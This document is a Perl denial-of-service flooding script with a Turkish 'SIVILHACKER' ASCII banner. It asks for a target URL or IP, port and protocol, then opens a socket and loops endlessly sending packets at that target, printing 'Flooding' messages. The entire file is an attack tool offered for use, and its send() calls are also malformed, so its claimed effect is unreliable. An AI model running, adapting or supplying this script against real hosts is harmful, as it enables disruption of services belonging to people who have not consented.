#!/usr/bin/perl

use IO::Socket;

system("clear || cls");
#Script Banner================================================================
print q{
                   .-"      "-.
                  /            \
                 |    Cyb     |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/__________________________
 (_)@8@8{}<________|-\IIIIII/-|_S_I_V_I_L_H_A_C_K_E_R>
        )_/        \          /
       (@           `--------` Hosgeldin!

 [---]   by:> Cyb  [---]
 [---]   Version:> 1. 0	     [---]
};
# Hakk?nda ==============================================
print "\n URL Veya IP===============================";
print "\n URL Veya IP: "; # IP Yeri
chop ($host = <stdin>);
print "===============================";
print "\n URL nin Veya IP nin Portu: "; # Port Yeri
chop ($port = <stdin>);
print "===============================";
print "\n URL Nin Veya IP nin Modu (TCP ve UDP) :"; # Mod Seçimi
chop ($proto = <stdin>);
system("clear || cls");
print "\n     {DDOS Sisteme Giriyor............} \n\n";
sleep 3;

{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "$proto" ) || die "\n start Attack !";


}
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Attack start################

}


##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye


